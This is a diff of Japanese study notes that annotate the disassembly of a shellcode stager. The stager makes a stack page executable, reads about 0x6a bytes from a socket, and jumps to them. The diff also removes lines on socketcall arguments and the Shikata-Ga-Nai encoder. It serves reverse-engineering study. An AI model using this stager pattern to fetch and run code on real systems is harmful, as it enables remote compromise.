@@ -196,7 +196,7 @@ eax            0x56556000          1448435712
 |+-0x08048173:	jmp    0x804819c
 +->0x08048175:	mov    dl,0x7                                   ; PROT_READ | PROT_WRITE | PORT_EXEC
  | 0x08048177:	mov    ecx,0x1000                               ; size : 0x1000
- | 0x0804817c:	mov    ebx,esp                                  ; stack addr
+ | 0x0804817c:	mov    ebx,esp                                  ; addr : 0xffffd000
  | 0x0804817e:	shr    ebx,0xc
  | 0x08048181:	shl    ebx,0xc
  | 0x08048184:	mov    al,0x7d
@@ -205,14 +205,14 @@ eax            0x56556000          1448435712
  | 0x0804818a:	js     0x804819c
  | 0x0804818c:	pop    ebx                                      ; socket fd
  | 0x0804818d:	mov    ecx,esp                                  ; address of shellcode (0xffffd244)
- | 0x0804818f:	cdq                                               exec here ?
+ | 0x0804818f:	cdq
  | 0x08048190:	mov    dl,0x6a                                  ; read count 0x6a byte
  | 0x08048192:	mov    al,0x3
  | 0x08048194:	int    0x80                                     ; systemcall 0x3 (read)
  | 0x08048196:	test   eax,eax
- | 0x08048198:	js     0x804819c
- | 0x0804819a:	jmp    ecx
- +-0x0804819c:	mov    eax,0x1
+ +-0x08048198:	js     0x804819c
+ | 0x0804819a:	jmp    ecx                                      ; exec shelcode
+ +>0x0804819c:	mov    eax,0x1
    0x080481a1:	mov    ebx,0x1
    0x080481a6:	int    0x80                                     ; systemcall 0x1 (exit)
    0x080481a8:	xor    ebx,ebx
@@ -220,7 +220,3 @@ eax            0x56556000          1448435712
    0x080481ac:	pop    eax
    0x080481ad:	int    0x80                                     ; systemcall 0x1 (exit)
 ```
-- ```#socketcall```ソケット関数で使う引数はスタックに積まれる。（っぽい）
-## その他のアイディア
-```Shikata-Ga-Nai```エンコーダの背景知識
-### FPU命令
